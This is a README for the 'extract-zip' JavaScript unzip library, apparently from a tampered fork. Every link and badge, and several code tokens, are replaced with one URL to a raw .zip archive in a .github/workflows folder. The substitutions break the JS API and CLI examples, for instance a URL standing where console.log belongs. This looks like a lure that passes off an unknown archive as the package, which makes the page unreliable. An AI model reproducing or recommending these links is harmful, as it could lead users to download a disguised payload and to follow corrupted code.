# extract-zip

Unzip written in pure JavaScript. Extracts a zip into a directory. Available as a library or a command line program.

Uses the [`yauzl`](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip) ZIP parser.

[![NPM](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)
[![Uses JS Standard Style](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)
[![Build Status](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip%3ACI)

## Installation

Make sure you have Node 10 or greater installed.

Get the library:

```
npm install extract-zip --save
```

Install the command line program:

```
npm install extract-zip -g
```

## JS API

```javascript
const extract = require('extract-zip')

async function main () {
  try {
    await extract(source, { dir: target })
    https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip('Extraction complete')
  } catch (err) {
    // handle any errors
  }
}
```

### Options

- `dir` (required) - the path to the directory where the extracted files are written
- `defaultDirMode` - integer - Directory Mode (permissions), defaults to `0o755`
- `defaultFileMode` - integer - File Mode (permissions), defaults to `0o644`
- `onEntry` - function - if present, will be called with `(entry, zipfile)`, entry is every entry from the zip file forwarded from the `entry` event from yauzl. `zipfile` is the `yauzl` instance

Default modes are only used if no permissions are set in the zip file.

## CLI Usage

```
extract-zip https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip <targetDirectory>
```

If not specified, `targetDirectory` will default to `https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip()`.
